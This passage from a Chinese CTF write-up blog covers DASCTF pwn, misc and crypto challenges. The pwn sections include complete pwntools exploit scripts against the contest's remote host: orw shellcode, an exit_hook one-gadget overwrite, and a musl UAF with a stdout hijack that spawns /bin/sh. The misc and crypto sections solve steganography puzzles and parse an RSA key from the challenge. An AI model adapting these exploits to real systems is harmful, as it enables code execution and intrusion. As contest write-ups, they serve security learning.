class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :io.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :io.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :io.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :io.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :io.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(io.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :io.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;tcp.cloud.dasctf.com&#x27;,23784)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="number">23784</span>)</span><br><span class="line">    rl(<span class="string">b&#x27;[2] Input: (ye / no)\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;no&#x27;</span>)</span><br><span class="line">    payload = asm(<span class="string">&#x27;push rax; pop rsi; push rbx; pop rax; push rbx; pop rdi; pop rbx; pop rbx; pop rsp; pop rdx;&#x27;</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x10</span>, asm(<span class="string">&#x27;pop rbx;&#x27;</span>)) + p8(<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&#x27;Code ========\n&#x27;</span>, pl)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span></span><br><span class="line">    sh += asm(<span class="string">&#x27;sub rsp, 0x100&#x27;</span>);</span><br><span class="line">    sh += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">    sh += asm(<span class="string">&#x27;mov rdi, 3; mov rsi, 0; mov rax, 33; syscall;&#x27;</span>)</span><br><span class="line">    sh += asm(<span class="string">&#x27;mov rax, 0; mov rdi, 0; mov rsi, r12; mov rdx, 0x100; syscall;&#x27;</span>)</span><br><span class="line">    sh += asm(<span class="string">&#x27;mov rdi, 1; mov rsi, 4; mov rax, 33; syscall;&#x27;</span>)</span><br><span class="line">    sh += asm(<span class="string">&#x27;mov rax, 1; mov rdi, 4; mov rsi, r12; mov rdx, 0x100; syscall;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s(sh)</span><br><span class="line">        rl(<span class="string">b&#x27;&#123;&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            pr()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1693653857368-4f1d6875-0a93-4c57-aa55-da329687d0f4.png#averageHue=%23fdf9df&clientId=u54cc927f-202a-4&from=paste&height=88&id=u0c02196a&originHeight=110&originWidth=778&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79436&status=done&style=none&taskId=ub19517f1-34b7-48e4-86b4-3fe20c53a78&title=&width=622.4" alt="图片.png"></p>
<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>巨简单的opcode，直接打ogg打exit_hook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;tcp.cloud.dasctf.com&#x27;,24505)</span><br><span class="line">payload = flat([</span><br><span class="line">    2,</span><br><span class="line">    7,0x3c4b78,</span><br><span class="line">    6,0xf1147,</span><br><span class="line">    1,</span><br><span class="line">    7,0xf1147,</span><br><span class="line">    6,0x5f0040+3848,</span><br><span class="line">    3,</span><br><span class="line">])</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1693667197608-ea1fdc43-21c6-43cd-a09e-7818a08ca5d3.png#averageHue=%23819eb0&clientId=u66e24a69-e8fb-4&from=paste&height=287&id=u7ec4a954&originHeight=359&originWidth=1038&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132954&status=done&style=none&taskId=uc4715177-f21e-4422-a503-ba057f562c9&title=&width=830.4" alt="图片.png"></p>
<h2 id="cookieBox"><a href="#cookieBox" class="headerlink" title="cookieBox"></a>cookieBox</h2><p>老版本的musl pwn<br>strings命令查到musl版本是1.1.24<br>看这个文章做的<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253">https://www.anquanke.com/post/id/202253</a>。<br>利用UAF，伪造chunk获得任意地址写，再劫持stdout即可。<br>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#_*_coding:utf-8_*_</span><br><span class="line">from pwn import *</span><br><span class="line">from pwn import u64,u32,p64,p32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]  </span><br><span class="line"></span><br><span class="line"># elf = ELF(&quot;./cookieBox&quot;)</span><br><span class="line"># libc = ELF(&quot;./libc.so&quot;)</span><br><span class="line">p = remote(&quot;tcp.cloud.dasctf.com&quot;, 24816)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(sz,c=b&#x27;a&#x27;*8):</span><br><span class="line">    p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;size:\n&quot;,str(sz))</span><br><span class="line">    p.sendafter(&quot;Content:\n&quot;,c)</span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">def edit(idx,c):</span><br><span class="line">    p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">    p.sendafter(&quot;content:\n&quot;,c)</span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;)</span><br><span class="line">    p.sendlineafter(&quot;idx:\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">libc_base = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x292e50</span><br><span class="line">print(&quot;libc_base = &quot;,libc_base)</span><br><span class="line"></span><br><span class="line">stdout = libc_base + 0x292300</span><br><span class="line">mal = libc_base + 0x292b20</span><br><span class="line">system = libc_base + 0x42688</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">add(0x80,&quot;a&quot;*8)</span><br><span class="line">delete(1)</span><br><span class="line">edit(5,p64(stdout - 0x20) + p64(stdout - 0x20))</span><br><span class="line"></span><br><span class="line">add(0x80,&quot;b&quot;*8)</span><br><span class="line">delete(1)</span><br><span class="line">edit(5,p64(mal) + p64(stdout - 0x20))</span><br><span class="line">add(0x80, p64(stdout - 0x20) + p64(mal))</span><br><span class="line"></span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;s&#x27;*0x10</span><br><span class="line">payload += flat(&#123;0: &#x27;/bin/sh\x00&#x27;,0x20: 1,0x28: 1,0x30: system,0x38: 0,0x48: system &#125;)</span><br><span class="line">edit(9,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1693669459850-9f06b094-fb4b-424d-be99-1f815f2162be.png#averageHue=%23c2dde5&clientId=ued2ce740-bb04-4&from=paste&height=164&id=u5f138e0b&originHeight=205&originWidth=905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98611&status=done&style=none&taskId=ue644f861-598b-4532-a25e-b9771bccfe8&title=&width=724" alt="图片.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652825466-7a3b2ce3-afe5-4b9d-8cd1-43053c0dc4e4.png#averageHue=%23faf8f7&clientId=u1016775c-414b-4&from=paste&height=179&id=ubaaf3651&originHeight=179&originWidth=397&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3987&status=done&style=none&taskId=udac82527-c831-420c-a603-76e104c2c41&title=&width=397" alt="1c8e5a535add06a6da2129b51c777a8e.png"><br>发现图片的宽高是有问题的，CRC爆破一下，修改宽高，然后发现文件尾有一个压缩包，然后修改压缩包0304里面是feld文本，根据图片得到是Gronsfeld编码然后，是5位密码，<br><code>vzbtrvplnnvphsqkxsiqibroou</code><br>还有这一段话<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652819449-48d52b73-4274-4c12-9733-a632ee65305e.png#averageHue=%23d7dce0&clientId=u1016775c-414b-4&from=paste&height=63&id=ue159732e&originHeight=63&originWidth=294&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3587&status=done&style=none&taskId=u51d89ad7-8c36-4d35-835a-eb6b487ab8f&title=&width=294" alt="f29625e85024fe09dcb053be9adc107b.png"><br>且文件有两个文件尾，推测是CVE-2023-28303，然后解码<br>TRYTOTHINKTHESNIPPINGTOOLS<br>给出了工具，然后<br>python gui.py得到flag<br><code>CvE_1s_V3Ry_intEr3sting!!</code></p>
<h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h2><p>拿到img先放入DiskGenius，发现有一个encrypt且大小是20mb，然后还有一个压缩包以及一个图片，压缩包文件尾有一个jpg，两个图片一样，推测是盲水印，然后解出挂载密码<br><code>watermark_is_fun</code><br>然后挂载得到一个文本发现是0宽<br>解出一个密码，然后文本先base32，然后维吉尼亚得到flag<br><code>DASCTF&#123;congratulati0n_you_f1nd_th3_f14g!!!&#125;</code></p>
<h2 id="ai和nia的交响曲"><a href="#ai和nia的交响曲" class="headerlink" title="ai和nia的交响曲"></a>ai和nia的交响曲</h2><p>从流量包导出了所有东西，里面有压缩包，压缩包伪加密和零宽隐写，获取flag1<br><code>@i_n1a_l0v3S_</code><br>顺路还有个hint<code>BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code><br>是个b站视频<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693703555585-e1dcc0d9-6470-4695-a906-1a4c15fe99fa.png#averageHue=%23fdfdfd&clientId=u46e862b5-1501-4&from=paste&height=370&id=u3316a49b&originHeight=370&originWidth=1182&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50891&status=done&style=none&taskId=ubf86ddea-ca70-4c87-a3d4-44502b0d1e4&title=&width=1182" alt="image.png"><br>然后题目给了一个hint<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693703602454-00c87932-a0a8-4cf4-85a2-78aec5ac8629.png#averageHue=%23f0f0f0&clientId=u46e862b5-1501-4&from=paste&height=453&id=uf2f8a858&originHeight=453&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64126&status=done&style=none&taskId=u76379142-2971-4242-ae69-884eadcd40d&title=&width=798" alt="image.png"><br>得到后半段<code>CAOCAOGAIFAN</code><br>FLAG：@i_n1a_l0v3S_CAOCAOGAIFAN</p>
<h2 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h2><p>义眼丁真鉴定为插了帧<br>gpt写的脚本哦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 打开GIF文件</span></span><br><span class="line">gif_path = <span class="string">&quot;out.gif&quot;</span></span><br><span class="line">gif_image = Image.<span class="built_in">open</span>(gif_path)</span><br><span class="line"><span class="comment"># 获取GIF中的帧数</span></span><br><span class="line">num_frames = gif_image.n_frames</span><br><span class="line"><span class="comment"># 创建一个目录来保存PNG图像</span></span><br><span class="line">output_directory = <span class="string">&quot;output/&quot;</span></span><br><span class="line">os.makedirs(output_directory, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 循环遍历每一帧并保存为PNG图像</span></span><br><span class="line"><span class="keyword">for</span> frame_number <span class="keyword">in</span> <span class="built_in">range</span>(num_frames):</span><br><span class="line">gif_image.seek(frame_number)</span><br><span class="line">frame_image = gif_image.copy()</span><br><span class="line">frame_image.save(<span class="string">f&quot;<span class="subst">&#123;output_directory&#125;</span><span class="subst">&#123;frame_number&#125;</span>.png&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后就是按照帧的长度去写一个脚本得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-</span><br><span class="line">&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++</span><br><span class="line">&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++</span><br><span class="line">&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-</span><br><span class="line">&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++</span><br><span class="line">&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;</span><br><span class="line">[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-</span><br><span class="line">&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-</span><br><span class="line">&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++</span><br><span class="line">&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.</span><br><span class="line">&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.</span><br><span class="line">&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++</span><br><span class="line">&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-</span><br><span class="line">&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-</span><br><span class="line">&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++</span><br><span class="line">&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]</span><br></pre></td></tr></table></figure>
<p>Pen_Pineapple_Apple_Pen</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h2><p>考点：RSA证书内容+异或<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 证书里的PEM格式内容</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;&#x27;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL</span></span><br><span class="line"><span class="string">SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE</span></span><br><span class="line"><span class="string">N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW</span></span><br><span class="line"><span class="string">eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv</span></span><br><span class="line"><span class="string">IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn</span></span><br><span class="line"><span class="string">/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn</span></span><br><span class="line"><span class="string">jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5</span></span><br><span class="line"><span class="string">X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA</span></span><br><span class="line"><span class="string">UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u</span></span><br><span class="line"><span class="string">Gz3++w==&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s = b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(binascii.hexlify(s))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">证书整理后的结果：</span></span><br><span class="line"><span class="string">30</span></span><br><span class="line"><span class="string">82 0277</span></span><br><span class="line"><span class="string">0201 00</span></span><br><span class="line"><span class="string">300d06092a864886f70d010101050004820261</span></span><br><span class="line"><span class="string">30</span></span><br><span class="line"><span class="string">82 025d</span></span><br><span class="line"><span class="string">0201 00</span></span><br><span class="line"><span class="string">n 028181 00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></span><br><span class="line"><span class="string">e 0203 010001</span></span><br><span class="line"><span class="string">d 028181 00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span></span><br><span class="line"><span class="string">p 0241 